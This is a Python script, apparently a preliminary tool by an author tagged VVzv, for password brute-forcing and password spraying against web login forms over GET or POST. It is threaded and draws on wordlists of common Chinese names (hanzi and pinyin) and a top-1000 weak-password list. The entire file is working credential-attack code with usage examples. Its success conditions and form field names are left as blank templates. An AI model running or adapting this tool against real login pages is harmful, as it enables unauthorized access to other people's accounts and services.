# !/usr/bin/python
# -*- coding:utf-8 -*-
# __Author__: VVzv

import os
import argparse
import threading
import requests

# 初步测试脚本
# 爆破
def intruder(domain, user, passwd, semaphore, send_type, info):
    semaphore.acquire()
    # header头信息
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER',
    }
    # get请求
    if info:
        print("\033[31m[*] {}/{}\033[0m".format(user, passwd))
    if send_type.lower() == 'get':
        # 指定get请求包格式
        url = domain + "".format(user, passwd)
        req = requests.get(url, headers=headers)
        if req.status_code == 200:
            # 指定get登陆成功的格式
            if req.text == "": # req.text != "" / "" not in req.text
                print('\033[36m=========================================\033[0m')
                print("\033[32m[+] 发现用户名:%s->密码:%s\033[0m" % (user, passwd))
                print('\033[36m=========================================\033[0m')
                os.system("kill -9 {}".format(os.getpid())) # Linux关闭进程方法，Windows切换为taskkill /im pid /f
    #post请求
    elif send_type.lower() == 'post':
        # post data数据表
        form_data = {
            "":user,
            "":passwd,
        }
        req = requests.post(domain, headers=headers, data=form_data, allow_redirects=False)
        if req.status_code == 200: # or 302
            if req.text == "":
                print('\033[36m=========================================\033[0m')
                print("\033[32m[+] 发现用户名:%s->密码:%s\033[0m" % (user, passwd))
                print('\033[36m=========================================\033[0m')
                os.system("kill -9 {}".format(os.getpid()))
    semaphore.release()

if __name__ == '__main__':
    use = '''\033[35m
get请求密码爆破：     python3 intruder_spray.py -d http://xxx.com/ -u admin
get请求密码喷洒：  python3 intruder_spray.py -d http://xxx.com/ -c spray -p 123456
post请求密码爆破： python3 intruder_spray.py -d http://xxx.com/ -u admin -s post
post请求密码喷洒： python3 intruder_spray.py -d http://xxx.com/ -c spray -p 123456 -s post
设置线程和显示过程：python3 intruder_spray.py -d http://xxx.com/ -u admin -s post -t 10 -v\033[0m'''
    parse = argparse.ArgumentParser(usage=use)
    parse.add_argument('-d', '--domain', type=str, help='目标域名')
    parse.add_argument('-l', '--letter', type=str, default=False, help='用户名拼音/汉字，默认拼音，true为汉字')
    parse.add_argument('-c', '--change', type=str, default='burst', help='密码爆破/喷洒，默认爆破，spray为喷洒')
    parse.add_argument('-u', '--username', type=str, default=None, help='指定爆破用户名')
    parse.add_argument('-p', '--password', type=str, default=None, help='指定喷洒密码')
    parse.add_argument('-s', '--sendType', type=str, default='get', help='请求格式，默认get请求')
    parse.add_argument('-t', '--thread', type=int, default=5)
    parse.add_argument('-v', '--verbosity', action="store_true", help='显示记录')
    args = parse.parse_args()
    semaphore = threading.BoundedSemaphore(args.thread)
    # 加载用户名和密码字典
    hanzi_name_dict = open('./top500_name_dict.txt', 'r').readlines()
    pinyin_name_dict = open('./top500_name_pinyin_dict.txt', 'r').readlines()
    weak_password_dict = open('./全国弱口令TOP1000.txt', 'r').readlines()
    if args.change == 'burst':
        if args.username == None:
            parse.print_help()
        else:
            for passwd in weak_password_dict:
                if args.verbosity:
                    info = True
                else:
                    info = False
                t = threading.Thread(target=intruder, args=(args.domain, args.username, passwd, semaphore, args.sendType, info))
                t.start()
            while threading.active_count() != 1:
                pass
    elif args.change == 'spray':
        if args.password == None:
            parse.print_help()
        else:
            if args.letter == 'true':
                for hanzi_name in hanzi_name_dict:
                    if args.verbosity:
                        info = True
                    else:
                        info = False
                    t = threading.Thread(target=intruder, args=(args.domain, hanzi_name.strip(), args.password, semaphore, args.sendType, info))
                    t.start()
                while threading.active_count() != 1:
                    pass
            else:
                for pinyin_name in pinyin_name_dict:
                    if args.verbosity:
                        info = True
                    else:
                        info = False
                    t = threading.Thread(target=intruder, args=(args.domain, pinyin_name.strip(), args.password, semaphore, args.sendType, info))
                    t.start()
                while threading.active_count() != 1:
                    pass

